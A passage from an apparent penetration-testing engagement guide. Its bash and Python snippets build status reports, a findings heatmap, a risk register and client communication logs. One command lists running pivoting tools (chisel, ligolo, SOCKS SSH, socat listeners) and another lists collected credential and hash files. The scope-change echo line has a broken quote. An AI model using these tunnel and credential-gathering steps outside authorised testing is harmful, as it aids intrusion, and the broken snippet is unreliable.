- Engagement ID: $(grep "Engagement ID" engagement/state/metadata.txt | cut -d: -f2- | xargs)

## Credentials Discovered
$(find engagement/evidence/ -name "*cred*" -o -name "*hash*" 2>/dev/null | sort)

## Active Sessions/Tunnels
$(ps aux | grep -E "chisel|ligolo|ssh.*-D|socat.*LISTEN" | grep -v grep)

## Pending Items
- [ ] Complete post-exploitation phase
- [ ] Generate final report
- [ ] Client debrief scheduled
EOF
```

### Engagement Risk Heatmap

```bash
# Generate risk heatmap from findings
python3 << 'PYEOF'
import os
from collections import defaultdict

evidence_dir = "engagement/evidence/vuln"
severity_by_host = defaultdict(lambda: {"critical":0,"high":0,"medium":0,"low":0})

for f in os.listdir(evidence_dir):
    if f.startswith("F-") and f.endswith(".md"):
        content = open(os.path.join(evidence_dir, f)).read()
        host = "unknown"
        for line in content.split("\n"):
            if "Asset" in line and "**" in line:
                host = line.split("**")[-2].strip() if "**" in line else "unknown"
        for sev in ["critical","high","medium","low"]:
            if sev.upper() in content[:200].upper():
                severity_by_host[host][sev] += 1

print("| Host | Critical | High | Medium | Low |")
print("|------|----------|------|--------|-----|")
for host in sorted(severity_by_host.keys()):
    s = severity_by_host[host]
    print(f"| {host} | {s['critical']} | {s['high']} | {s['medium']} | {s['low']} |")
PYEOF
```

### Engagement Cost Tracking

```bash
python3 -c "
hours = float(input(\"Total hours: \"))
rate = float(input(\"Hourly rate: \")) or 250
print(f\"Engagement cost: \${hours * rate:,.2f}\")
"
```

### Scope Change Management

```bash
echo "SCOPE_CHANGE: $(date -u +%Y-%m-%dT%H:%M:%SZ) | Added: 192.168.2.50 | Reason: Client requested\" >> engagement/state/scope_changes.log
```

### Engagement Risk Register

```bash
# Generate a structured risk register for the engagement
cat > /tmp/risk_register.sh << 'SCRIPT'
#!/bin/bash
ENG_DIR="/opt/evidence/$(date +%Y-%m-%d)_engagement"
mkdir -p "$ENG_DIR/risk"

cat > "$ENG_DIR/risk/register.csv" << 'CSV'
id,category,description,likelihood,impact,risk_score,mitigation
R001,technical,Target system instability during testing,Medium,High,12,Test during maintenance window; have rollback plan
R002,legal,Scope creep beyond signed authorization,Low,Critical,10,Strict scope verification before each test phase
R003,operational,Evidence loss due to tool failure,Low,High,8,Real-time backup; redundant evidence capture
CSV

echo "[+] Risk register created: $ENG_DIR/risk/register.csv"
SCRIPT

bash /tmp/risk_register.sh
```

### Client Communication Log

```bash
# Maintain timestamped client communication log
cat > /usr/local/bin/eng-comm << 'EOF'
#!/bin/bash
ENG_DIR="${1:-/opt/evidence/current}"
COMM_FILE="$ENG_DIR/communications.log"
echo "[$(date -u '+%Y-%m-%dT%H:%M:%SZ')] $2" >> "$COMM_FILE"
echo "[+] Communication logged to $COMM_FILE"
EOF

chmod +x /usr/local/bin/eng-comm
eng-comm /opt/evidence/engagement_2025 "Kicked off external pentest phase 2 - notified client PM"
```
